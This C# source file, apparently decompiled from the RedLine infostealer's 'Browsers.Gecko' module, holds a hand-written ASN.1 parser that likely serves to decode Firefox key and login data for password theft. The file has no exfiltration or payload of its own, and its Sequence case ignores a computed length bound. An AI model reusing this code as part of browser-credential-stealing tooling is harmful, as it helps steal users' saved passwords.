using RedLine.Models.Gecko;
using System;

namespace RedLine.Logic.Browsers.Gecko
{
  public static class Asn1Factory
  {
    public static Asn1Object Create(byte[] dataToParse)
    {
      Asn1Object asn1Object = new Asn1Object();
      for (int index = 0; index < dataToParse.Length; ++index)
      {
        Asn1Type asn1Type = (Asn1Type) dataToParse[index];
        int num = 0;
        switch (asn1Type)
        {
          case Asn1Type.Integer:
            asn1Object.Objects.Add(new Asn1Object()
            {
              ObjectType = Asn1Type.Integer,
              ObjectLength = (int) dataToParse[index + 1]
            });
            byte[] numArray1 = new byte[(int) dataToParse[index + 1]];
            int length1 = index + 2 + (int) dataToParse[index + 1] > dataToParse.Length ? dataToParse.Length - (index + 2) : (int) dataToParse[index + 1];
            Array.Copy((Array) dataToParse, index + 2, (Array) numArray1, 0, length1);
            asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = numArray1;
            index = index + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
            break;
          case Asn1Type.OctetString:
            asn1Object.Objects.Add(new Asn1Object()
            {
              ObjectType = Asn1Type.OctetString,
              ObjectLength = (int) dataToParse[index + 1]
            });
            byte[] numArray2 = new byte[(int) dataToParse[index + 1]];
            int length2 = index + 2 + (int) dataToParse[index + 1] > dataToParse.Length ? dataToParse.Length - (index + 2) : (int) dataToParse[index + 1];
            Array.Copy((Array) dataToParse, index + 2, (Array) numArray2, 0, length2);
            asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = numArray2;
            index = index + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
            break;
          case Asn1Type.ObjectIdentifier:
            asn1Object.Objects.Add(new Asn1Object()
            {
              ObjectType = Asn1Type.ObjectIdentifier,
              ObjectLength = (int) dataToParse[index + 1]
            });
            byte[] numArray3 = new byte[(int) dataToParse[index + 1]];
            int length3 = index + 2 + (int) dataToParse[index + 1] > dataToParse.Length ? dataToParse.Length - (index + 2) : (int) dataToParse[index + 1];
            Array.Copy((Array) dataToParse, index + 2, (Array) numArray3, 0, length3);
            asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = numArray3;
            index = index + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
            break;
          case Asn1Type.Sequence:
            byte[] dataToParse1;
            if (asn1Object.ObjectLength == 0)
            {
              asn1Object.ObjectType = Asn1Type.Sequence;
              asn1Object.ObjectLength = dataToParse.Length - (index + 2);
              dataToParse1 = new byte[asn1Object.ObjectLength];
            }
            else
            {
              asn1Object.Objects.Add(new Asn1Object()
              {
                ObjectType = Asn1Type.Sequence,
                ObjectLength = (int) dataToParse[index + 1]
              });
              dataToParse1 = new byte[(int) dataToParse[index + 1]];
            }
            num = dataToParse1.Length > dataToParse.Length - (index + 2) ? dataToParse.Length - (index + 2) : dataToParse1.Length;
            Array.Copy((Array) dataToParse, index + 2, (Array) dataToParse1, 0, dataToParse1.Length);
            asn1Object.Objects.Add(Asn1Factory.Create(dataToParse1));
            index = index + 1 + (int) dataToParse[index + 1];
            break;
        }
      }
      return asn1Object;
    }
  }
}
